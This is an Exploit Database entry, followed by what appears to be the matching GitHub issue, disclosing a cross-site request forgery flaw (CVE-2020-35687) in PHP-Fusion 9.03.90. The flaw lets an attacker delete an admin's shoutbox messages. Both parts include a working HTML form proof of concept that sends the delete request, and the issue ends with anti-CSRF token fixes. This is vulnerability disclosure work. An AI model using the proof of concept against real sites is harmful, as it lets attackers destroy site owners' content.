# Exploit Title: PHP-Fusion CMS 9.03.90 - Cross-Site Request Forgery (Delete admin shoutbox message)
# Date: 2020-12-21
# Exploit Author: Mohamed Oosman B S
# Vendor Homepage: https://www.php-fusion.co.uk/
# Software Link: https://www.php-fusion.co.uk/phpfusion_9_downloads.php
# Version: 9.03.90 and below
# Tested on: Windows 10
# CVE : CVE-2020-35687

1. Description:
PHP-Fusion version 9.03.90 is vulnerable to CSRF attack which leads to deletion of shoutbox messages by the attacker on behalf of the logged in victim.

2. Proof of Concept
As the requests for deleting the admin shoutbox are sent using the GET method, the CSRF attack to delete an attacker-controlled shoutbox message can be performed by having the admin visit https://TARGET.com/infusions/shoutbox_panel/shoutbox_archive.php?s_action=delete&shout_id=1 directly,
after getting to know the shout_id of the message, as it is sequential.

<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://TARGET/infusions/shoutbox_panel/shoutbox_archive.php">
<input type="hidden" name="s&#95;action" value="delete" />
<input type="hidden" name="shout&#95;id" value="3" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>

```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Description

![@oosman-rak](https://avatars.githubusercontent.com/u/74533050?v=4&size=48)[oosman-rak](https://github.com/oosman-rak)opened [on Dec 21, 2020](https://github.com/PHPFusion/PHPFusion/issues/2347#issue-772287114)

**Describe the bug**

PHP-Fusion version 9.03.90 is vulnerable to CSRF attack which leads to deletion of shoutbox messages by the attacker on behalf of the logged in victim..

**Version**

PHP-Fusion version 9.03.90.

**To Reproduce**

Steps to reproduce the behavior:

1. Go to '<https://v9.demos.php-fusion.co.uk/home.php>'
2. Login using Demo credentials.
3. Create any random shoutbox message post logging into the application.
4. Now create an HTML form which performs the expected operation of deleting the shoutbox message. The one like below.

```
<html>
    <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://v9.demos.php-fusion.co.uk/infusions/shoutbox_panel/shoutbox_archive.php">
      <input type="hidden" name="s&#95;action" value="delete" />
      <input type="hidden" name="shout&#95;id" value="3" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

4. Save the above code as html.
5. Now, re-login into the application.
6. Open the above html file in the same browser in which we are logged in.
7. Click on submit request and observe the shoutbox message gets deleted.
8. The attacker can change shout\_id to different value and observe that all the shoutbox messages of the logged in user can be deleted.

**Expected behavior**

1. Implement an anti-CSRF token which is random and changes/destroys after it is used once.
2. Include this anti-CSRF token it in the POST body whenever the user deletes/performs any state changing requests.
